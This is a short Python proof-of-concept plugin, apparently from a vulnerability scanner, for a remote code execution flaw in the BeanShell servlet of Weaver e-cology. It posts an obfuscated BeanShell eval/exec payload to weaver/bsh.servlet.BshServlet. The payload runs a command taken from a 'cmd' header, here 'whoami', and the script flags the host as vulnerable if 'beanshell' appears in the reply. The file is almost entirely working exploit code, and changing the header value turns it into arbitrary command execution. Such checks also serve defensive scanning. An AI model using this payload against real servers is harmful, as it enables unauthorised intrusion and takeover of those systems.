#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology bsh'
        self.keyword = ['ecology', 'bsh']
        self.info = 'ecology bsh'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "cmd": "whoami"
            }
            data = 'bsh.script=eval ("ex"%2b"ec (bsh.httpServletRequest.getHeader(\"cmd\"))")&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'
            async with ClientSession() as session:
                for path in path_list:
                    url = path + "weaver/bsh.servlet.BshServlet"
                    async with session.post(url=url, headers=headers, data=data) as response:
                        if response!=None:
                            text = await response.text()
                            if 'beanshell' in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "ecology bsh"})
                                return